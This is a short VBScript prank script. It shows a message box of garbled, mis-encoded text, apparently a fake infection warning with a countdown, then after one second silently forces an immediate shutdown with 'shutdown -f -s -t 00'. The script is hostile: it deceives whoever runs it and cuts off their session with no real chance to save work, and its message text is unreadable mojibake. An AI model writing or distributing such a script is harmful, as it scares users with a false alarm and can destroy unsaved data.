msgbox"���������ļ�����ѱ���Ƕ����������֮����������"+VbCrLf+"����60��������ϵ����Ա���� �� �����س���"
wscript.sleep 1000
dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
WSHshell.run "shutdown -f -s -t 00",0 ,true
